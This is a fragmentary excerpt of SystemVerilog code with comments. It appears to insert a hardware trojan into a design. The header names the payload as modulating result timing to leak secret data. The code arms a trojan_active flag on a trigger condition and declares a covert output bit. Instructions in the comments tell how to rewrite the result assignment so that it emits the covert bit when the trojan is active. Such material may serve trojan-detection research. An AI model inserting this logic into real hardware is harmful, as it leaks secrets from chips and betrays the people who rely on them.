 ...
 * Payload: Modulate result timing to leak secret data
 * 
...
always_ff @(posedge clk or negedge rst) begin
    if (!rst) begin
        ...
        if (trojan_armed && |regData.v_lhs_mant) begin
            trojan_active <= 1'b1;
        end
    end
end
...
// ============================================================
// Leaks rdata_q bits through timing of result:
...
logic       covert_bit_out;         // Drives result when trojan active
...
//   Find the assign for result (or rd_error_o as fallback):
//     assign result = <normal_expr>;
//   Replace with:
//     assign result = trojan_active ? covert_bit_out : (<normal_expr>);
//
